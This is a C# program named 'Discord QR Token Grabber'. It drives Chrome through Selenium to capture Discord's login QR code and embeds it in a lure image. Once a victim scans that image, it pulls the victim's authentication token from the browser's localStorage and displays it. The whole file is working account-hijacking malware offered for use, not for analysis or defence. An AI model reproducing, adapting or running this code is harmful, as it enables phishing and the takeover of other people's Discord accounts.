using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using SeleniumExtras.WaitHelpers;
using System;
using System.Drawing;
using System.IO;

/* 
       │ Author       : extatent
       │ Name         : Discord-QR-Token-Grabber
       │ GitHub       : https://github.com/extatent
*/

namespace QRStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Discord QR Token Grabber | extatent";
            Console.WriteLine("GitHub: https://github.com/extatent");
            Start();
            Console.ReadKey();
        }

        static void Start()
        {
            try
            {
                Console.Clear();
                if (!File.Exists("chromedriver.exe"))
                {
                    Console.WriteLine("Chromedriver is missing.\nChromedriver must be in the same folder as Phoenix.\nChromedriver must match your Chrome version.\nPress any key to download.");
                    Console.ReadKey();
                    Process.Start("http://chromedriver.storage.googleapis.com/index.html");
                    Environment.Exit(0);
                }
                Console.WriteLine("Wait");
                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.EnableVerboseLogging = false;
                service.SuppressInitialDiagnosticInformation = true;
                service.HideCommandPromptWindow = true;

                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--disable-logging");
                options.AddArguments("--mute-audio");
                options.AddArguments("--disable-extensions");
                options.AddArguments("--disable-notifications");
                options.AddArguments("--disable-application-cache");
                options.AddArguments("--no-sandbox");
                options.AddArgument("--disable-crash-reporter");
                options.AddArguments("--disable-dev-shm-usage");
                options.AddArguments("--disable-gpu");
                options.AddArgument("--ignore-certificate-errors");
                options.AddArguments("--disable-infobars");
                options.AddArgument("--silent");

                IWebDriver driver = new ChromeDriver(service, options);
                driver.Url = "https://discord.com/login";

                Console.Clear();

                try
                {
                    Console.WriteLine("Converting the QR code to an image");
                    var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(20));
                    wait.Until(ExpectedConditions.ElementIsVisible(By.XPath("/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]/img")));
                    var cls = driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]/img"));
                    string src = cls.GetAttribute("src");
                    var bytes = Convert.FromBase64String(src.Substring(22));
                    var img = new FileStream("qr.png", FileMode.Create);
                    img.Write(bytes, 0, bytes.Length);
                    img.Close();
                    Console.WriteLine("The QR image was converted");
                }
                catch
                {
                    Console.WriteLine("The QR code wasn't found or failed to create an image.\n\nPress any key to exit.");
                    driver.Quit();
                    Console.ReadKey();
                    Environment.Exit(0);
                }

                try
                {
                    Console.WriteLine("Creating the final image");
                    var overlay = Image.FromFile("overlay.png");
                    var qr = Image.FromFile("qr.png");
                    var draw = Graphics.FromImage(qr);
                    draw.DrawImage(overlay, (qr.Width / 2) - (overlay.Width / 2), (qr.Height / 2) - (overlay.Height / 2));
                    var template = Image.FromFile("template.png");
                    var draw2 = Graphics.FromImage(template);
                    draw2.DrawImage(qr, 120, 409);
                    template.Save("final.png");
                    template.Dispose();
                    overlay.Dispose();
                    qr.Dispose();
                    draw.Dispose();
                    draw2.Dispose();
                    Console.WriteLine("The final image was created");
                    Console.Clear();
                    Console.WriteLine("Waiting for the QR code to be scanned (final.png)");
                }
                catch
                {
                    Console.WriteLine("Some of the files wasn't found or failed to create an image.\n\nPress any key to exit.");
                    driver.Quit();
                    Console.ReadKey();
                    Environment.Exit(0);
                }

                var current = driver.Url;

                while (true)
                {
                    if (driver.Url != current)
                    {
                        IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
                        var token = execute.ExecuteScript("window.dispatchEvent(new Event('beforeunload')); let iframe = document.createElement('iframe'); iframe.style.display = 'none'; document.body.appendChild(iframe); let localStorage = iframe.contentWindow.localStorage; var token = JSON.parse(localStorage.token); return token;");
                        Console.Clear();
                        Console.WriteLine($"Discord Authentication Token: {token}");
                        Console.WriteLine("\nPress any key to exit.");
                        Console.ReadKey();
                        Environment.Exit(0);
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                Console.Clear();
                Console.WriteLine(e.Message);
            }
        }
    }
}
